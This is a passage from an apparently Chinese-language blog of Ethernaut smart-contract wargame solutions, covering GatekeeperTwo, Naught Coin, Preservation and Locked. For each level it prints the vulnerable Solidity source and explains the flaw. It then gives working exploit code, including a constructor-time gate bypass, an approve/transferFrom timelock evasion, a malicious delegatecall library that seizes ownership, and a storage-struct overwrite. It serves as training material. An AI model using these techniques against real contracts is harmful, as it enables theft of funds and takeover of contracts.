class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; <span class="attr">x</span> := extcodesize(caller) &#125;</span><br><span class="line">    <span class="built_in">require</span>(x == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    <span class="built_in">require</span>(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(<span class="number">0</span>) - <span class="number">1</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">enter</span>(<span class="params">bytes8 _gateKey</span>) <span class="title">public</span> <span class="title">gateOne</span> <span class="title">gateTwo</span> <span class="title">gateThree</span>(<span class="params">_gateKey</span>) <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analyse-13"><a href="#Analyse-13" class="headerlink" title="Analyse"></a>Analyse</h2><ul>
<li>满足三个 <code>modifier</code> 即可</li>
<li><code>gateOne</code> 很简单，通过第三方合约调用 <code>enter</code> 即可</li>
<li><code>gateThree</code> 毕竟简单，直接异或逆运算<ul>
<li><code>_gateKey = bytes8(uint64(keccak256(address(this))) ^ (uint64(0) - 1))</code></li>
</ul>
</li>
<li><code>gateTwo</code> 比较有技巧性，用了 <span id="inline-blue">内联汇编</span> 的写法，翻了一下文档 <a href="https://ethereum.github.io/yellowpaper/paper.pdf" rel="external nofollow noopener noreferrer" target="_blank">https://ethereum.github.io/yellowpaper/paper.pdf</a> ：<ul>
<li><strong>caller : Get caller address.</strong></li>
<li><strong>extcodesize : Get size of an account’s code.</strong></li>
</ul>
</li>
<li>按照题目的意思，要使当前合约代码区为空，显然与解题是矛盾的，仔细读文档，有一些细节</li>
</ul>
<p id="div-border-left-red">Note that while the initialisation code is executing, the newly created address exists but with no intrinsic body code.<br>……<br>During initialization code execution, EXTCODESIZE on the address should return zero, which is the length of the code of the account while CODESIZE should return the length of the initialization code.</p>

<ul>
<li><strong>也就是说，在执行初始化代码（构造函数），而新的区块还未添加到链上的时候，新的地址已经生成，然而代码区为空，此时，调用 <code>EXTCODESIZE()</code> 返回为 <code>0</code></strong></li>
<li>那么，只需要在第三方合约的构造函数中调用题目合约中的 <code>enter()</code> 即可</li>
</ul>
<h2 id="Solution-12"><a href="#Solution-12" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; <span class="attr">x</span> := extcodesize(caller) &#125;</span><br><span class="line">    <span class="built_in">require</span>(x == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    <span class="built_in">require</span>(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(<span class="number">0</span>) - <span class="number">1</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">enter</span>(<span class="params">bytes8 _gateKey</span>) <span class="title">public</span> <span class="title">gateOne</span> <span class="title">gateTwo</span> <span class="title">gateThree</span>(<span class="params">_gateKey</span>) <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract hack &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hack</span>(<span class="params">address _c</span>) </span>&#123;</span><br><span class="line">        GatekeeperTwo c = GatekeeperTwo(_c);</span><br><span class="line">        bytes8 _gateKey = bytes8(uint64(keccak256(address(<span class="keyword">this</span>))) ^ (uint64(<span class="number">0</span>) - <span class="number">1</span>));</span><br><span class="line">        c.enter(_gateKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接部署合约 <code>hack</code> 即可<br><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/19.png" alt><br><br></p>
<h1 id="Naught-Coin"><a href="#Naught-Coin" class="headerlink" title="Naught Coin"></a>Naught Coin</h1><h2 id="Require-14"><a href="#Require-14" class="headerlink" title="Require"></a>Require</h2><ul>
<li><code>Complete this level by getting your token balance to 0.</code></li>
</ul>
<h2 id="Source-14"><a href="#Source-14" class="headerlink" title="Source"></a>Source</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'zeppelin-solidity/contracts/token/ERC20/StandardToken.sol'</span>;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is StandardToken &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  string public constant name = <span class="string">'NaughtCoin'</span>;</span><br><span class="line">  string public constant symbol = <span class="string">'0x0'</span>;</span><br><span class="line">  uint public constant decimals = <span class="number">18</span>;</span><br><span class="line">  uint public timeLock = now + <span class="number">10</span> years;</span><br><span class="line">  uint public INITIAL_SUPPLY = (<span class="number">10</span> ** decimals).mul(<span class="number">1000000</span>);</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">NaughtCoin</span>(<span class="params">address _player</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    player = _player;</span><br><span class="line">    totalSupply_ = INITIAL_SUPPLY;</span><br><span class="line">    balances[player] = INITIAL_SUPPLY;</span><br><span class="line">    Transfer(<span class="number">0x0</span>, player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint256 _value</span>) <span class="title">lockTokens</span> <span class="title">public</span> <span class="title">returns</span>(<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Prevent the initial owner from transferring tokens until the timelock has passed</span></span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    <span class="keyword">if</span> (msg.sender == player) &#123;</span><br><span class="line">      <span class="built_in">require</span>(now &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analyse-14"><a href="#Analyse-14" class="headerlink" title="Analyse"></a>Analyse</h2><ul>
<li>根据题意，需要将自己的 <code>balance</code> 清空。合约提供了 <code>transfer()</code> 进行转账，但有一个 <code>modifier lockTokens()</code> 限制，只有 <code>10</code> 年后才能调用 <code>transfer()</code></li>
<li>注意该合约是 <code>StandardToken</code> 的子合约，题目中也给了 <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md" rel="external nofollow noopener noreferrer" target="_blank">The ERC20 Spec</a> 和 <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts" rel="external nofollow noopener noreferrer" target="_blank">The OpenZeppelin codebase</a></li>
<li>在子合约找不出更多信息的时候，把目光更多放到父合约 <a href="https://github.com/aragon/zeppelin-solidity/blob/master/contracts/token/StandardToken.sol" rel="external nofollow noopener noreferrer" target="_blank">StandardToken.sol</a> 和接口上</li>
<li>在 <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md" rel="external nofollow noopener noreferrer" target="_blank">The ERC20 Spec</a> 中，除了 <code>transfer()</code> 之外，还有 <code>transferFrom()</code> 函数也可以进行转账</li>
<li>直接看父合约 <a href="https://github.com/aragon/zeppelin-solidity/blob/master/contracts/token/StandardToken.sol" rel="external nofollow noopener noreferrer" target="_blank">StandardToken.sol</a></li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">contract StandardToken &#123;</span><br><span class="line">    using ERC20Lib <span class="keyword">for</span> ERC20Lib.TokenStorage;</span><br><span class="line">    ERC20Lib.TokenStorage token;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address to, uint value</span>) <span class="title">returns</span> (<span class="params">bool ok</span>) </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> token.transfer(to, value);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transferFrom</span>(<span class="params">address from, address to, uint value</span>) <span class="title">returns</span> (<span class="params">bool ok</span>) </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> token.transferFrom(<span class="keyword">from</span>, to, value);</span><br><span class="line">       &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>跟进 <a href="https://github.com/aragon/zeppelin-solidity/blob/master/contracts/token/ERC20Lib.sol" rel="external nofollow noopener noreferrer" target="_blank">ERC20Lib.sol</a></li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">library ERC20Lib &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">TokenStorage storage self, address _to, uint _value</span>) <span class="title">returns</span> (<span class="params">bool success</span>) </span>&#123;</span><br><span class="line">        self.balances[msg.sender] = self.balances[msg.sender].minus(_value);</span><br><span class="line">        self.balances[_to] = self.balances[_to].plus(_value);</span><br><span class="line">        Transfer(msg.sender, _to, _value);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transferFrom</span>(<span class="params">TokenStorage storage self, address _from, address _to, uint _value</span>) <span class="title">returns</span> (<span class="params">bool success</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> _allowance = self.allowed[_from](msg.sender);</span><br><span class="line"></span><br><span class="line">        self.balances[_to] = self.balances[_to].plus(_value);</span><br><span class="line">        self.balances[_from] = self.balances[_from].minus(_value);</span><br><span class="line">        self.allowed[_from](msg.sender) = _allowance.minus(_value);</span><br><span class="line">        Transfer(_from, _to, _value);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">approve</span>(<span class="params">TokenStorage storage self, address _spender, uint _value</span>) <span class="title">returns</span> (<span class="params">bool success</span>) </span>&#123;</span><br><span class="line">        self.allowed[msg.sender](_spender) = _value;</span><br><span class="line">        Approval(msg.sender, _spender, _value);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以直接调用这个 <code>transferFrom</code> ，但是 <code>transferFrom</code> 需要 <code>msg.sender</code> 获得授权，由于我们就是合约的 <code>owner</code> ，所以可以自己调用 <code>approve</code> 给自己授权</p>
<h2 id="Solution-13"><a href="#Solution-13" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.approve(player, (<span class="keyword">await</span> contract.INITIAL_SUPPLY()).toNumber())</span><br><span class="line"><span class="keyword">await</span> contract.transferFrom(player, instance, (<span class="keyword">await</span> contract.INITIAL_SUPPLY()).toNumber())</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/20.png" alt><br><br></p>
<h1 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h1><h2 id="Require-15"><a href="#Require-15" class="headerlink" title="Require"></a>Require</h2><ul>
<li><code>This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.</code></li>
<li><code>The goal of this level is for you to claim ownership of the instance you are given.</code></li>
</ul>
<h2 id="Source-15"><a href="#Source-15" class="headerlink" title="Source"></a>Source</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.23</span>;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// public library contracts </span></span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  <span class="comment">// Sets the function signature for delegatecall</span></span><br><span class="line">  bytes4 constant setTimeSignature = bytes4(keccak256(<span class="string">"setTime(uint256)"</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;</span><br><span class="line">    timeZone1Library = _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library = _timeZone2LibraryAddress; </span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// set the time for timezone 1</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setFirstTime</span>(<span class="params">uint _timeStamp</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the time for timezone 2</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setSecondTime</span>(<span class="params">uint _timeStamp</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Simple library contract to set the time</span></span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// stores a timestamp </span></span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setTime</span>(<span class="params">uint _time</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analyse-15"><a href="#Analyse-15" class="headerlink" title="Analyse"></a>Analyse</h2><ul>
<li><code>delegatecall</code> 定义：<strong><address>.delegatecall(…) returns (bool): issue low-level DELEGATECALL, returns false on failure, forwards all available gas, adjustable</address></strong></li>
<li><code>delegatecall</code> 与 <code>call</code> 功能类似，区别在于 <code>delegatecall</code> 仅使用给定地址的代码，其它信息则使用当前合约(如存储，余额等等)。注意 <code>delegatecall</code> 是危险函数，它可以完全操作当前合约的状态，可以参考第7题 <code>Delegation</code></li>
<li><code>delegateCall</code> 方法仅仅使用目标合约的代码， 其余的 <code>storage</code> 等数据均使用自己的，这就使得某些访存操作会错误的处理对象</li>
<li>所以这个题可以这样解决：<ul>
<li>我们调用 <code>Preservation</code> 的 <code>setFirstTime</code> 函数实际通过 <code>delegatecall</code> 执行了 <code>LibraryContract</code> 的 <code>setTime</code> 函数，修改了 <code>slot 1</code> ，也就是修改了 <code>timeZone1Library</code> 变量</li>
<li>这样，我们第一次调用 <code>setFirstTime</code> 将 <code>timeZone1Library</code> 变量修改为我们的恶意合约的地址，第二次调用 <code>setFirstTime</code> 就可以执行我们的任意代码了</li>
</ul>
</li>
</ul>
<h2 id="Solution-14"><a href="#Solution-14" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.23</span>;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// public library contracts </span></span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  <span class="comment">// Sets the function signature for delegatecall</span></span><br><span class="line">  bytes4 constant setTimeSignature = bytes4(keccak256(<span class="string">"setTime(uint256)"</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;</span><br><span class="line">    timeZone1Library = _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library = _timeZone2LibraryAddress; </span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// set the time for timezone 1</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setFirstTime</span>(<span class="params">uint _timeStamp</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the time for timezone 2</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setSecondTime</span>(<span class="params">uint _timeStamp</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Simple library contract to set the time</span></span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// stores a timestamp </span></span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setTime</span>(<span class="params">uint _time</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack &#123;</span><br><span class="line">    address public timeZone1Library;</span><br><span class="line">    address public timeZone2Library;</span><br><span class="line">    address public owner;</span><br><span class="line">    </span><br><span class="line">    address instance_address = <span class="number">0x7cec052e622c0fb68ca3b2e3c899b8bf8b78663c</span>;</span><br><span class="line">    Preservation target = Preservation(instance_address);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">attack1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        target.setFirstTime(uint(address(<span class="keyword">this</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">attack2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        target.setFirstTime(uint(<span class="number">0x88d3052d12527f1fbe3a6e1444ea72c4ddb396c2</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setTime</span>(<span class="params">uint _time</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        timeZone1Library = address(_time);</span><br><span class="line">        timeZone2Library = address(_time);</span><br><span class="line">        owner = address(_time);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先调用 <code>attack1()</code> ，再调用 <code>attack2()</code> 即可<br><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/21.png" alt><br><br></p>
<h1 id="Locked"><a href="#Locked" class="headerlink" title="Locked"></a>Locked</h1><h2 id="Require-16"><a href="#Require-16" class="headerlink" title="Require"></a>Require</h2><ul>
<li><code>This name registrar is locked and will not accept any new names to be registered.</code></li>
<li><code>Unlock this registrar to beat the level.</code></li>
</ul>
<h2 id="Source-16"><a href="#Source-16" class="headerlink" title="Source"></a>Source</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.23</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// A Locked Name Registrar</span></span><br><span class="line">contract Locked &#123;</span><br><span class="line"></span><br><span class="line">    bool public unlocked = <span class="literal">false</span>;  <span class="comment">// registrar locked, no name updates</span></span><br><span class="line">    </span><br><span class="line">    struct NameRecord &#123; <span class="comment">// map hashes to addresses</span></span><br><span class="line">        bytes32 name; <span class="comment">// </span></span><br><span class="line">        address mappedAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> NameRecord) public registeredNameRecord; <span class="comment">// records who registered names </span></span><br><span class="line">    mapping(<span class="function"><span class="params">bytes32</span> =&gt;</span> address) public resolve; <span class="comment">// resolves hashes to addresses</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params">bytes32 _name, address _mappedAddress</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">// set up the new NameRecord</span></span><br><span class="line">        NameRecord newRecord;</span><br><span class="line">        newRecord.name = _name;</span><br><span class="line">        newRecord.mappedAddress = _mappedAddress; </span><br><span class="line"></span><br><span class="line">        resolve[_name] = _mappedAddress;</span><br><span class="line">        registeredNameRecord[msg.sender] = newRecord; </span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(unlocked); <span class="comment">// only allow registrations if contract is unlocked</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analyse-16"><a href="#Analyse-16" class="headerlink" title="Analyse"></a>Analyse</h2><ul>
<li>典型的利用 <code>struct</code> 默认是 <code>storage</code> 的题目</li>
<li>函数中声明的 <code>newRecord</code> 结构体修改 <code>name</code> 和 <code>mappedAddress</code> 实际分别改的是 <code>unlocked</code> 和 <code>bytes32 name</code> </li>
<li>所以把 <code>name</code> 对应的 <code>slot 0</code> 的值改成 <code>1</code> 就行了</li>
</ul>
<h2 id="Solution-15"><a href="#Solution-15" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.23</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// A Locked Name Registrar</span></span><br><span class="line">contract Locked &#123;</span><br><span class="line"></span><br><span class="line">    bool public unlocked = <span class="literal">false</span>;  <span class="comment">// registrar locked, no name updates</span></span><br><span class="line">    </span><br><span class="line">    struct NameRecord &#123; <span class="comment">// map hashes to addresses</span></span><br><span class="line">        bytes32 name; 